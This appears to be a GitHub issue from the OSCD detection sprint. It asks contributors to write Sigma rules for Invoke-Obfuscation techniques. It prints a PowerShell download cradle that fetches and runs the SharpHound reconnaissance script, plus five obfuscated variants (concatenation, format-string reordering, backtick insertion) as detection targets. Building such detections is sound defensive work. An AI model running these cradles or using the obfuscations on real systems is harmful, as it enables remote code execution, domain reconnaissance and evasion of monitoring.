# Hello, fellow OSCD participant!
This is your guide on how you can help us with soving this issue.

# Tasklist
You can pick up some of the methods of PowerShell command and script obfuscation, provided by the [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) framework from the table below and develop Sigma rules for them. You will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules.

## Original command
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
```

## Invoke-Obfuscation premise
```powershell
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
```
## Just pick up the Case # you prefer and write a Sigma rule for it. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the number of the case you solved (e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1")

| Case # | Option #1 | Option #2 | Option #3 | Result |
| :---: | :---: | :---: | :---: | --- |
| 1 | TOKEN | TOKEN\STRING | TOKEN\STRING\1 | Invoke-Expression (New-Object Net.WebClient).DownloadString(('ht'+'tp'+'s://raw.gith'+'ubus'+'e'+'rcont'+'ent.com/BloodHo'+'und'+'A'+'D'+'/B'+'loo'+'dHo'+'un'+'d/a7'+'e'+'a5'+'36'+'387'+'0d92'+'5bc31'+'d'+'3'+'a441a361f38b0a'+'add0b'+'/Inge'+'s'+'tors/'+'Shar'+'pHou'+'n'+'d'+'.ps'+'1')); Invoke-BloodHound |
| 2 | TOKEN | TOKEN\STRING | TOKEN\STRING\1 | Invoke-Expression (New-Object Net.WebClient).DownloadString(("{16}{2}{17}{26}{10}{0}{3}{19}{7}{9}{6}{5}{8}{20}{23}{4}{18}{12}{24}{22}{11}{1}{25}{21}{13}{15}{14}"-f 'ntent.com/Blo','s/','/','o','441','ea5363870','nd/a7','ood','d92','Hou','.githubuserco','Ingestor','38b','und.p','1','s','https:','/r','a361f','dHoundAD/Bl','5bc3','o','aadd0b/','1d3a','0','SharpH','aw')); Invoke-BloodHound |
| 3 | TOKEN | TOKEN\COMMAND | TOKEN\COMMAND\1 | i`N`VOKe-E`xpRe`S`SIOn (new-`obJE`cT Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); InVoKe-b`l`OOdH`o`U`ND |
| 4 | TOKEN | TOKEN\COMMAND | TOKEN\COMMAND\2 | .('Invoke-E'+'xpr'+'es'+'s'+'i'+'on') (&('New-Obj'+'e'+'c'+'t') Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); .('Invo'+'ke-B'+'loodHoun'+'d')
| 5 | TOKEN | TOKEN\COMMAND | TOKEN\COMMAND\3 | .("{1}{0}{2}{3}"-f 'oke','Inv','-','Expression') (&("{2}{3}{0}{1}" -f 'jec','t','N','ew-Ob') Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); &("{3}{1}{0}{2}"-f 'd','loo','Hound','Invoke-B')

